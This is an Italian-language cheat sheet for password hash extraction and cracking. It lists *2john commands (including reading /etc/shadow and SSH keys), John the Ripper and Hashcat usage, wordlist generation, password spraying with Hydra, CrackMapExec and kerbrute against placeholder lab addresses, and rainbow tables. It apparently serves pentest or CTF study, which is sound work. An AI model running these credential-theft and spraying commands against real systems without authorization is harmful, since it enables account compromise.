# 🎨 Passwords & Cracking – Poster Edition

🧭 **Mappa rapida** per estrazione e cracking di hash con **John the Ripper** e **Hashcat**.

---

> 📦 **Estrarre hash (tool *2john*)**
>
> * 🔑 **Shadow (Linux)**
>
>   ```bash
>   unshadow /etc/passwd /etc/shadow > shadow.txt
>   ```
> * 📂 **Archivi**
>
>   ```bash
>   zip2john file.zip > zip.hash
>   rar2john file.rar > rar.hash
>   7z2john.pl file.7z > 7z.hash
>   ```
> * 📄 **Documenti**
>
>   ```bash
>   pdf2john.py file.pdf > pdf.hash
>   office2john.py file.docx > office.hash
>   ```
> * 🗄️ **Database / repo**
>
>   ```bash
>   keepass2john db.kdbx > kdbx.hash
>   git2john .git > git.hash
>   ```
> * 🔐 **Chiavi & sistemi cifrati**
>
>   ```bash
>   ssh2john id_rsa > ssh.hash
>   bitlocker2john disk.vhd > bitlocker.hash
>   truecrypt2john volume.tc > tc.hash
>   veracrypt2john volume.vc > vc.hash
>   androidbackup2john backup.ab > ab.hash
>   ```
> * 🏢 **Kerberos / AD**
>
>   ```bash
>   krb5tgs2john file.kirbi > tgs.hash
>   krb5pa2john file.kirbi > pa.hash
>   ```

---

> 🦾 **John the Ripper – Workflow**
>
> **1️⃣ Estrai l’hash** → `zip2john file.zip > zip.hash`
> **2️⃣ Crack con wordlist**
>
> ```bash
> john --wordlist=rockyou.txt --rules zip.hash --format=PKZIP
> ```
>
> **2️⃣ bis – Crack con mask**
>
> ```bash
> john zip.hash --mask=?u?l?l?l?l?d?d --format=PKZIP
> ```
>
> **3️⃣ Mostra password**
>
> ```bash
> john --show zip.hash
> ```

---

> ⚡ **Hashcat – GPU**
>
> **Sintassi base**
>
> ```bash
> hashcat -m <MODE> -a <ATTACK> hashes.txt wordlist.txt
> ```
>
> **Mode comuni**
>
> * MD5 → `-m 0`
> * SHA1 → `-m 100`
> * NTLM → `-m 1000`
> * sha512crypt → `-m 1800`
> * bcrypt → `-m 3200`
> * WPA2/PMKID → `-m 22000`
>
> **Esempi**
>
> ```bash
> hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule
> hashcat -m 22000 -a 3 wifi.hc22000 '?d?d?d?d?d?d?d?d'
> hashcat --show -m 1000 ntlm.txt
> ```

---

> 🧬 **Wordlist Mangling**
>
> * `cewl -d 2 -m 5 -w cewl.txt https://target.tld`
> * `cupp` → profiling interattivo
> * `rsmangler --file base.txt --output mangled.txt --leetspeak --years 1990-2025`
> * `crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o crunch.txt`
> * `pipal cracked.txt > stats.txt`

---

> 🌐 **Password Spraying**
>
> * **SSH (Hydra)**
>
>   ```bash
>   hydra -L users.txt -p Estate2025 ssh://10.10.10.10
>   ```
> * **SMB (CME)**
>
>   ```bash
>   cme smb 10.10.10.0/24 -u users.txt -p "Password123"
>   ```
> * **Kerberos (kerbrute)**
>
>   ```bash
>   kerbrute passwordspray -d corp.local --dc 10.10.10.5 users.txt
>   ```

---

> 🌈 **Rainbow Tables**
>
> * Genera tabella
>
>   ```bash
>   rtgen md5 loweralpha 1 8 0 2400 8000000 0
>   rtsort .
>   ```
> * Crack hash
>
>   ```bash
>   rcracki_mt . -h <hash>
>   ```
> * GUI storica → **ophcrack** (LM/NTLM)

---
